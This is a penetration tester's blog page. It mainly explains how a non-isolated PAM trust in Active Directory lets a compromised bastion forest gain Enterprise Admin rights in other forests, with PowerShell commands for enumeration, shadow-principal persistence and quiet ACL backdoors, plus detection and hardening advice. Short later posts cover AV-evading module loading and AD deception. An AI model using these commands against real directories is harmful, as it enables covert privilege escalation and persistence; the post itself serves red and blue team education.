Let's get back to the scenario I saw during the assessment. The client enabled PAM and they were using a forest in production (not a separate bastion or admin forest) to manage other forest(s). The forest used to manage other forests was located at their headquarters and their forests for their sites across the country were managed using it. An applause for them to have separate forests for different locations :)<br />
<br />
They were sold on the part that using PAM will protect the credential based attacks - no logon using credentials from the bastion forest to any other forest.<br />
<br />
But, a PAM trust where you do not have an isolated bastion forest is disastrous. Why? Because in such a case if we compromise the bastion forest we get high privileges (Enterprise Admins or Domain Admins) in the other forest. And:<br />
- There is no group membership (unlike Foreign Security Principals)<br />
- No ACLs modification<br />
- AFAIK, no other modification to look for in the forest which gets compromised!<br />
<br />
Let's have a look at an example. Following is the setup in my lab (diagram built using draw.io):<br />
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
</div>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj27jSOEr8tKHCVpp1bNkJ4I35mXqAUJJRRlodK4nBisYU1VzFkRSf6M1kipT2Qhjf32-CGPTY4iTKSFRSBCB0fG3OMkza3jyS-BlZy_fi7DWCrExYEkOzs-rWbKAOhg2Jjpn9dbyhDH2I/s1600/PAM+%25281%2529.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="184" data-original-width="779" height="127" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj27jSOEr8tKHCVpp1bNkJ4I35mXqAUJJRRlodK4nBisYU1VzFkRSf6M1kipT2Qhjf32-CGPTY4iTKSFRSBCB0fG3OMkza3jyS-BlZy_fi7DWCrExYEkOzs-rWbKAOhg2Jjpn9dbyhDH2I/s640/PAM+%25281%2529.png" width="550" /></a></div>
defensiveps.local is the bastion forest and powershell.local is the user/production forest.<br />
<br />
<h4>
Abusing the PAM trust</h4>
<br />
Here is how to identify and approach abusing a PAM trust:<br />
<br />
<b>Enumeration</b><br />
<br />
First, let's enumerate if our current forest has any PAM trust with any other forest, that is, if our current forest can access any other forest without worrying about SID Filtering.<br />
<br />
Using the <a href="https://github.com/samratashok/ADModule">ADModule</a>, we can simply run Get-ADTrust and look for a trust which has ForestTransitive set to True and SIDFilteringQuarantined set to False - this means that SID Filtering is disabled.<br />
<pre><textarea cols="70" readonly="readonly" rows="1" style="background-color: #012456; color: white;">Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)}
</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7KJR65vR6_rke_sVn2rGrao9u0-NFWDpAJlWzgCaQALdIoT2e_JHJy64-oUdcQumOuOF5bxw59E7wCcssoW03dJ5YH4XCHXvlLNhKZv3W9Q0qKHyxRzJFGcwPLvlwFpVEz5FBBusTlok/s1600/Enumerate_PAM_AD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="824" data-original-width="1600" height="205" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj7KJR65vR6_rke_sVn2rGrao9u0-NFWDpAJlWzgCaQALdIoT2e_JHJy64-oUdcQumOuOF5bxw59E7wCcssoW03dJ5YH4XCHXvlLNhKZv3W9Q0qKHyxRzJFGcwPLvlwFpVEz5FBBusTlok/s400/Enumerate_PAM_AD.png" width="400" /></a></div>
<br />
Powerview (dev branch), calculates the TrustAttributes for you but does not tell you if SID Filtering is enabled when used from the user/production forest.<br />
<br />
On the other hand, if you want to enumerate if your current forest is managed by a bastion forest (Blue Teams take note), look for ForestTransitive set to True and SIDFilteringForestAware set to True. In this case, <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c">TrustAttributes</a> is also a very good indicator. It is 0x00000400 (1024 in decimal) for PAM/PIM trust. Simplifying it, it is 1096 for PAM + External Trust + Forest Transitive.<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitdM8nTXT7_t6t4oD5gFToSFvrIb2XbuBF7nhMy9yMapilJFnZYHab14UqD4g2w-uZ2Ls4EB5Cn-B_ZTwWoSydM3yN9LJJR9xsqA8hifYDR4u61dXk6IdtLAPvpRXximVirCO1_fsfFhI/s1600/Enumerate_PAM_Production_AD.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="491" data-original-width="1310" height="148" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEitdM8nTXT7_t6t4oD5gFToSFvrIb2XbuBF7nhMy9yMapilJFnZYHab14UqD4g2w-uZ2Ls4EB5Cn-B_ZTwWoSydM3yN9LJJR9xsqA8hifYDR4u61dXk6IdtLAPvpRXximVirCO1_fsfFhI/s400/Enumerate_PAM_Production_AD.png" width="400" /></a></div>
In this case (when rum from the bastion forest), PowerView (dev) tells if PIM Trust is enabled. <br />
<br />
Next, let's enumerate the shadow security principals, its members from the current (bastion) forest and privileges in the user/production forest. We can use the following command from the ActiveDirectory module:</div>
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">Get-ADObject -SearchBase ("CN=Shadow Principal Configuration,CN=Services," + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl
</textarea></pre>
<div style="text-align: justify;">
<div class="separator" style="clear: both; text-align: center;">
&nbsp;<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYg_PRj7fCXzzruYhcCEf0cEo8Qg37G1pq2x2K0lpL0fFvP8DuG5r_fokdE-7MEA_A-mCR1mgBBy_ZVh1kxdkLobDwYv5PiOvseNLbkVU3fFDr8YMLOvIdDZ8gcdBAcSIt1V9N5hSsTOU/s1600/Enumerate_SSP_Privs.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="416" data-original-width="1600" height="103" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiYg_PRj7fCXzzruYhcCEf0cEo8Qg37G1pq2x2K0lpL0fFvP8DuG5r_fokdE-7MEA_A-mCR1mgBBy_ZVh1kxdkLobDwYv5PiOvseNLbkVU3fFDr8YMLOvIdDZ8gcdBAcSIt1V9N5hSsTOU/s400/Enumerate_SSP_Privs.png" width="400" /></a></div>
As clear in the above screenshot, we can look for Shadow securtiy principals in the special container 'CN=Shadow Principal Configuration,CN=Services' under the Configuration container on bastion forest. Following properties are the most interesting ones:<br />
<br />
- <b>Name</b> - Name of the shadow principal<br />
<br />
- <b>member</b> - Members from the bastion forest which are mapped to the shadow principal. In our example, it is the Domain Administrator of defensiveps.local.<br />
<br />
- <b>msDS-ShadowPrincipalSid</b> - The SID of the principal (user or group) in the user/prodcution forest whose privileges are assgined to the shadow security principal. In our example, it is the Enterpise Admins group in the user forest.<br />
<br />
<b>Using the shadow principals </b><br />
<br />
Now, if we compromise the user listed in "member" above we can use the shadow principals. In our example, we need to compromise the Administrator user fo defensiveps.local forest and then we will have enterpirse admins privileges on powershell.local forest!<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9lrnnkQXiXOQEpKf_ED3KJikQ1d7ae8t_i9L3L7PS9aPhI1VUf2-_YZ2bSZHv4qXnOxZfzMQq6UGYo_ejL65asWjPCqOn9m3FsBM86v7xpkmyBaYiW1b4Bid73WGBT4G2SQGCKPSxrOI/s1600/EA_PS.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="425" data-original-width="826" height="205" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj9lrnnkQXiXOQEpKf_ED3KJikQ1d7ae8t_i9L3L7PS9aPhI1VUf2-_YZ2bSZHv4qXnOxZfzMQq6UGYo_ejL65asWjPCqOn9m3FsBM86v7xpkmyBaYiW1b4Bid73WGBT4G2SQGCKPSxrOI/s400/EA_PS.png" width="400" /></a></div>
This is very interesting! We crossed the forest security boundary with ease :) Remember that we need not have group membership or ACL on the user forest.<br />
<br />
With the privileges achieved using shadow principals above, we can  access the user forest using RDP (explicit credentials of the  bastion user required), WMI, PowerShell Remoting etc. Please note that  if Kerberos AES Encryption is not enabled for the PAM trust, we need to  add the machines of existing forest in WSMan TrustedHosts and use  '-Authentication Negotiate' option with PowerShell remoting cmdlets.<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEin6jmo9P4NKY7g6N6rej6vRa388THkRwrdpKxb5iY_XWlLR2AnteGc8N5AMQHMuainLPXfse0Z6-OOqK_icLrbkyflT135hc53Io6UeUV1rb9f5hTFSaSWHvr2C0JBs-H1glVGQ1YZPUU/s1600/PS-DC.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="755" data-original-width="1286" height="233" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEin6jmo9P4NKY7g6N6rej6vRa388THkRwrdpKxb5iY_XWlLR2AnteGc8N5AMQHMuainLPXfse0Z6-OOqK_icLrbkyflT135hc53Io6UeUV1rb9f5hTFSaSWHvr2C0JBs-H1glVGQ1YZPUU/s400/PS-DC.png" width="400" /></a></div>
UPDATE (23/04/2019): Please note that we can also use SIDHistory injection using mimikatz to abuse the PAM trust. I left it out because using a shadow principal looks more normal in the user forest then SIDHistory injection. But, since <a href="https://twitter.com/dottor_morte">Riccardo</a> pointed out that it will still be useful, please take a note of it!<br />
<br />
<b>Persistence</b><br />
<br />
We can also use this for persistence. Please note that the persistence will be for the privileges on the user/prodcution forest and not the bastion forest itself.&nbsp;<b> </b><br />
<br />
Once we have compromised the bastion forest, there are multiple ways we can use:<br />
<br />
1. We can add a user to an existing shadow security principal container.<br />
<pre><textarea cols="70" readonly="readonly" rows="3" style="background-color: #012456; color: white;">Set-ADObject -Identity "CN=psforest-ShadowEnterpriseAdmin,CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=defensiveps,DC=local" -Add @{'member'="CN=lowpriv user,CN=Users,DC=defensiveps,DC=local"} -Verbose
</textarea></pre>
<br />
Please note that in this case, if someone looks at the details of the 'lowprivuser', he/she would appear to be a part of the psforest-ShadowEnterpriseAdmin 'group'. <br />
<br />
2. Better, we can modify the ACL of the shadow principal object. We can provide a user we control, Full Permission overt shadow principal object but the fun is always with <a href="https://www.labofapenetrationtester.com/2018/04/dcshadow.html">minimal permissions</a>. So, with only Read Members and Write Members permissions on the shadow principal object, we can add and remove princiapls at will from the shadow principals. Take a look at the below screenshot:<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhc9Xd2VZxje5kVUS04KbjNo2sp8TWYwqQagcBOgmPYlJPEUCdyalrg0MrPk98R0rsv1jl7Ske0UG720Uo_ahflTxLLZgzT4iWlZnL9acqMPFSmvtXfaIb8HV81XH2RePG_tDbhEYjiGOY/s1600/ACL_Persistence.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="768" data-original-width="1600" height="191" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhc9Xd2VZxje5kVUS04KbjNo2sp8TWYwqQagcBOgmPYlJPEUCdyalrg0MrPk98R0rsv1jl7Ske0UG720Uo_ahflTxLLZgzT4iWlZnL9acqMPFSmvtXfaIb8HV81XH2RePG_tDbhEYjiGOY/s400/ACL_Persistence.png" width="400" /></a></div>
<br />
Now, we can add or remove users at will with the privileges of 'reportdbadmin' user. On top of that, by-default there are no logs for any changes to the ACL or 'membership' of a shadow principal :)<br />
<br />
<h4>
Is PAM trust bad? Should I stop using a bastion forest?&nbsp; Why is Microsoft so evil? What is the meaning of life?</h4>
<h4>
<br />
</h4>
PAM trust is not bad, IF used wisely! You can use a bastion forest with PAM trust but please be careful. Learn from the setup we discussed just now. Do not use a regular forest (with users doing non-admin activities) as bastion forest. As Willem pointed out in his article, when you use the PAM trust you extended the security boundary of the user forest to include the  bastion forest. Treat the bastion forest as a special case and you will be fine. <br />
<br />
UPDATE: I forgot to link this: <a href="acchttps://docs.microsoft.com/en-us/microsoft-identity-manager/pam/privileged-identity-management-for-active-directory-domain-services">Microsoft provides guidance on providing access to the bastion forest using Microsoft Identity Management (MIM). </a><br />
<h4>
Detection</h4>
</div>
<div style="text-align: justify;">
</div>
On the bastion host, as we already discussed, there are no logs by-default for modification of membership or ACL of shadow principals. <br />
<br />
On the existing/production forest, the detection seems pretty easy. There will always be the Special Logon (4672), Logon (4624) and Logoff (4634) events when anyone uses principal from the bastion forest to access the existing forest. But the problem here is to detect an anomaly as the same logs will be there for actual operations as well. Unless, an adversary is using a new user or doing something very noisy, it may be difficult to detect her with only these entries. <br />
<br />
I hope this post enocurages everyone to have another look at their forest trusts. As always, please leave feedback :)<br />
<br /></div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
<span itemprop='name'>Nikhil SamratAshok Mittal</span>
</a>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html' itemprop='url'/>
<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2019-04-18T09:05:00+05:30'>9:05&#8239;AM</abbr></a>
</span>
<span class='post-comment-link'>
<a class='comment-link' href='https://www.labofapenetrationtester.com/2019/04/abusing-PAM.html#comment-form' onclick=''>
No comments:
  </a>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-1005506833'>
<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=8055274958523202112&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8055274958523202112&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8055274958523202112&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8055274958523202112&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8055274958523202112&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=8055274958523202112&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
Labels:
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Cross%20Forest' rel='tag'>Cross Forest</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Kerberos' rel='tag'>Kerberos</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell' rel='tag'>Offensive PowerShell</a>,
<a href='https://www.labofapenetrationtester.com/search/label/PAM' rel='tag'>PAM</a>,
<a href='https://www.labofapenetrationtester.com/search/label/PowerShell%20for%20Red%20Team' rel='tag'>PowerShell for Red Team</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Shadow%20Security%20Principals' rel='tag'>Shadow Security Principals</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Windows%20Tradecraft' rel='tag'>Windows Tradecraft</a>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
</div>

          </div></div>
        

          <div class="date-outer">
        
<h2 class='date-header'><span>Wednesday, October 31, 2018</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlw8zH5s83_BHIVMQhyniImVyFIZOXMBYb9EnJiFw6UZOvPD0jUCdKzJm4I2-dnYeRipYRGfPcYJIS_W8syMogEpU1H42AD7AhFO2XIvDsJ99RAy7M9vrh0G3AisqIYM1J05coAzQrYrs/s400/AD_Module.png' itemprop='image_url'/>
<meta content='8135211063584500909' itemprop='blogId'/>
<meta content='7401494977220498300' itemprop='postId'/>
<a name='7401494977220498300'></a>
<h3 class='post-title entry-title' itemprop='name'>
<a href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html'>Using ActiveDirectory module for Domain Enumeration from PowerShell Constrained Language Mode</a>
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-7401494977220498300' itemprop='articleBody'>
<div dir="ltr" style="text-align: left;" trbidi="on">
This is a quick post to make notes of something which I have been using and teaching for sometime.<br />
<br />
We can use Micorosft's PowerShell ActiveDirectory module without RSAT and administrative privileges. I came to know about this from <a href="https://janikvonrotz.ch/2015/09/09/deploy-powershell-activedirectory-module-without-installing-the-remote-server-tools/">this blog post</a>.<br />
<br />
So, if you have access to a Server which has the module installed (like a DC), copy the Microsoft.ActiveDirectory.Management.dll from C:\Windows\Microsoft.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management to your own machine and then use the Import-Module cmdlet to import the DLL:<br />
<pre><textarea cols="70" readonly="readonly" rows="2" style="background-color: #012456; color: white;">PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
</textarea></pre>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlw8zH5s83_BHIVMQhyniImVyFIZOXMBYb9EnJiFw6UZOvPD0jUCdKzJm4I2-dnYeRipYRGfPcYJIS_W8syMogEpU1H42AD7AhFO2XIvDsJ99RAy7M9vrh0G3AisqIYM1J05coAzQrYrs/s1600/AD_Module.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="668" data-original-width="1600" height="166" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlw8zH5s83_BHIVMQhyniImVyFIZOXMBYb9EnJiFw6UZOvPD0jUCdKzJm4I2-dnYeRipYRGfPcYJIS_W8syMogEpU1H42AD7AhFO2XIvDsJ99RAy7M9vrh0G3AisqIYM1J05coAzQrYrs/s400/AD_Module.png" width="400" /></a></div>
Please note that if you run Get-Command -Module ActiveDirectory, it would not return anything. To get that, copy the module directory as well from the server from following location: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\ActiveDirectory\. Then, use Import-Module, first the DLL and then the module:<br />
<pre><textarea cols="70" readonly="readonly" rows="4" style="background-color: #012456; color: white;">PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose
PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1
PS C:\> Get-Command -Module ActiveDirectory
</textarea></pre>
UPDATE (16-Nov-2018) - It is now possible to load the module from memory by using Import-ActiveDirectory.ps1. Thanks to a PR by @D1iv3: <br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiCWcvpe0EXPpdJJWixiLbxX5brKF5KT_n0DyxKF33njpL9o4cjQFN-dMMDmYDIlgiA_mTRxaA5qH2t2BDjUt6LUfmi9zhJaVRMH2PzYjRTwzpnhf9QDtEl2d4Dl7lkKafu7zhyoygK8U/s1600/AD_Module_Array.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="776" data-original-width="1600" height="193" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjiCWcvpe0EXPpdJJWixiLbxX5brKF5KT_n0DyxKF33njpL9o4cjQFN-dMMDmYDIlgiA_mTRxaA5qH2t2BDjUt6LUfmi9zhJaVRMH2PzYjRTwzpnhf9QDtEl2d4Dl7lkKafu7zhyoygK8U/s400/AD_Module_Array.png" width="400" /></a></div>
There are many benefits like very low chances of detection by AV, very wide coverage by cmdlets (I leave the usage of cmdlets for a later post :P), good filters for cmdlets, signed by Microsoft etc.<br />
<br />
I have uploaded a copy of module from Server 2016 on Github: <a href="https://github.com/samratashok/ADModule">https://github.com/samratashok/ADModule</a><br />
<br />
The biggest benefit is that this module works flawlessly in PowerShell Constrained Language Mode (CLM) :)<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRUzpUxMmD-jlvxS9h99fyDBIfADPN2UCUaOT0Vng6PL5jU7FDKrgp1WGn5177DZ2gKmZEko_ITgvRmZlIINdeTYyy4AFJEhSW7kuxhunJrb7RhAaEtmrHbCxna5P1alD4-SgZu8nyO2E/s1600/AD_Module_CLM.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="438" data-original-width="1600" height="108" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgRUzpUxMmD-jlvxS9h99fyDBIfADPN2UCUaOT0Vng6PL5jU7FDKrgp1WGn5177DZ2gKmZEko_ITgvRmZlIINdeTYyy4AFJEhSW7kuxhunJrb7RhAaEtmrHbCxna5P1alD4-SgZu8nyO2E/s400/AD_Module_CLM.png" width="400" /></a></div>
That is all!</div>
<div style='clear: both;'></div>
</div>
<div class='post-footer'>
<div class='post-footer-line post-footer-line-1'>
<span class='post-author vcard'>
Posted by
<span class='fn' itemprop='author' itemscope='itemscope' itemtype='http://schema.org/Person'>
<meta content='https://www.blogger.com/profile/02092541175521734123' itemprop='url'/>
<a class='g-profile' href='https://www.blogger.com/profile/02092541175521734123' rel='author' title='author profile'>
<span itemprop='name'>Nikhil SamratAshok Mittal</span>
</a>
</span>
</span>
<span class='post-timestamp'>
at
<meta content='http://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html' itemprop='url'/>
<a class='timestamp-link' href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html' rel='bookmark' title='permanent link'><abbr class='published' itemprop='datePublished' title='2018-10-31T22:40:00+05:30'>10:40&#8239;PM</abbr></a>
</span>
<span class='post-comment-link'>
<a class='comment-link' href='https://www.labofapenetrationtester.com/2018/10/domain-enumeration-from-PowerShell-CLM.html#comment-form' onclick=''>
No comments:
  </a>
</span>
<span class='post-icons'>
<span class='item-control blog-admin pid-1005506833'>
<a href='https://www.blogger.com/post-edit.g?blogID=8135211063584500909&postID=7401494977220498300&from=pencil' title='Edit Post'>
<img alt='' class='icon-action' height='18' src='https://resources.blogblog.com/img/icon18_edit_allbkg.gif' width='18'/>
</a>
</span>
</span>
<div class='post-share-buttons goog-inline-block'>
<a class='goog-inline-block share-button sb-email' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=email' target='_blank' title='Email This'><span class='share-button-link-text'>Email This</span></a><a class='goog-inline-block share-button sb-blog' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=blog' onclick='window.open(this.href, "_blank", "height=270,width=475"); return false;' target='_blank' title='BlogThis!'><span class='share-button-link-text'>BlogThis!</span></a><a class='goog-inline-block share-button sb-twitter' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=twitter' target='_blank' title='Share to X'><span class='share-button-link-text'>Share to X</span></a><a class='goog-inline-block share-button sb-facebook' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=facebook' onclick='window.open(this.href, "_blank", "height=430,width=640"); return false;' target='_blank' title='Share to Facebook'><span class='share-button-link-text'>Share to Facebook</span></a><a class='goog-inline-block share-button sb-pinterest' href='https://www.blogger.com/share-post.g?blogID=8135211063584500909&postID=7401494977220498300&target=pinterest' target='_blank' title='Share to Pinterest'><span class='share-button-link-text'>Share to Pinterest</span></a>
</div>
</div>
<div class='post-footer-line post-footer-line-2'>
<span class='post-labels'>
Labels:
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory' rel='tag'>Active Directory</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Active%20Directory%20Attacks%20for%20Red%20and%20Blue%20Teams' rel='tag'>Active Directory Attacks for Red and Blue Teams</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell' rel='tag'>Offensive PowerShell</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Offensive%20PowerShell%20for%20Red%20and%20Blue%20Teams' rel='tag'>Offensive PowerShell for Red and Blue Teams</a>,
<a href='https://www.labofapenetrationtester.com/search/label/Powershell' rel='tag'>Powershell</a>
</span>
</div>
<div class='post-footer-line post-footer-line-3'>
<span class='post-location'>
</span>
</div>
</div>
</div>
</div>

          </div></div>
        

          <div class="date-outer">
        
<h2 class='date-header'><span>Tuesday, October 16, 2018</span></h2>

          <div class="date-posts">
        
<div class='post-outer'>
<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='http://schema.org/BlogPosting'>
<meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjmm-lRbRq6OsM46ZjBgihre7Fs6zbsJWSrHtS-Eeln4SAM1ncSg0VvHdaclrySKZyvBMUTbkt7I_dPMFENPyi-Tz9MPxmAb6AFrAaVmUsXsX9t1YAkaUTdGrYx53TCRNkS4ZHJUKFM308/s400/DS_Access_GP.png' itemprop='image_url'/>
<meta content='8135211063584500909' itemprop='blogId'/>
<meta content='8408133389804595546' itemprop='postId'/>
<a name='8408133389804595546'></a>
<h3 class='post-title entry-title' itemprop='name'>
<a href='https://www.labofapenetrationtester.com/2018/10/deploy-deception.html'>Forging Trusts for Deception in Active Directory</a>
</h3>
<div class='post-header'>
<div class='post-header-line-1'></div>
</div>
<div class='post-body entry-content' id='post-body-8408133389804595546' itemprop='articleBody'>
<div dir="ltr" style="text-align: left;" trbidi="on"><div style="text-align: justify;"></div><div style="text-align: justify;">Deception has always been of interest to me. As a student of military history, I have always been fascinated by its implementation in warfare and looked at deception as something which is effective and generally low cost!</div><div style="text-align: justify;">Couple of years back, I got involved in development and extensive testing (from red team perspective) of couple of enterprise deception solutions over a period of many months. In early 2018, during one of my Active Directory classes, a student&nbsp; asked and ultimately hired me (thank you!) for testing three Deception products they were evaluating.&nbsp;</div><div style="text-align: justify;"><br />
</div><div style="text-align: justify;">With these experiences I realized that most of the focus for deception in Active Directory (AD) has been on honeyuser/honeytokens/honeycredentials. Tools like <a href="https://github.com/secureworks/dcept">dcept</a> and others are popular for this technique. There is a dearth of free and open source deception solutions for AD if we want to utilize deception to detect an adversary during the domain enumeration phase of an attack. That is something which we are going to address soon.<br />
<br />
Also, to increase interest and community involvement, I gave a talk on 'Forging Trusts for Deception in Active Directory' at <a href="https://sched.co/FXIf">BruCON</a> couple of weeks back (October 2018). Slides and video are at the end of this post. </div><div style="text-align: justify;"></div><br />
<h4 style="text-align: justify;">What is Deception?</h4><br />
<div style="text-align: justify;">Deception is a psychology game. Red teams and adversaries have been using it for so long against unsuspecting users to trick them in opening malicious attachments or clicking on links. Once inside an AD environment, an adversary tries to use credentials of other users and pivot through other machines to mix with the existing logs and traffic.<br />
<br />
Blue teams utilize deception by providing service, privileges or information can adversary is looking for. IMHO, blue teams, have an upper hand when it comes to deception, both in terms of psychology and technical controls.<br />
<br />
<h4>The attacker psychology&nbsp;</h4>There is a psychological condition called <a href="https://en.wikipedia.org/wiki/Illusory_superiority">Illusive Superiority</a> which applies to most of the adversaries and red teams. They think of themselves as smarter and much more talented than the blue teams. Along with this, the tendency to go for the "lowest hanging fruit" and an urge for getting DA privileges quickly, makes them a fruitful target for deception :)<br />
<br />
So, the idea is, defenders show the adversaries what they want to see. For example, a user whose password never expires or a Server 2003 computer.<br />
<br />
<h4></h4><h4>Desired properties of a decoy</h4><h4></h4>Taken directly from my slides, desired properties of a decoy:<br />
<ol><li>Should be desirable enough so that an attacker enumerates the object.</li>
<li>Should be easily configurable.</li>
<li>No configuration changes required on endpoints.</li>
<li>Should not be triggered for normal admin activity. </li>
</ol>Number 4 above is the hardest to achieve. If we are targeting enumeration, we must make the attacker activity or tools stand-out to avoid false positives.<br />
<br />
<h4></h4><h4>Deploying Deception</h4>So, how can we achieve above desired properties with just the built-in tools in AD? We can use Group Policy to set AD Access logging, configure 'interesting' objects and filter out false positives!<br />
<br />
The Group Policy setting required for AD Access is Windows Settings | Security Settings | Advanced Audit Policy Configuration | DS Access - Audit Directory Service Access <br />
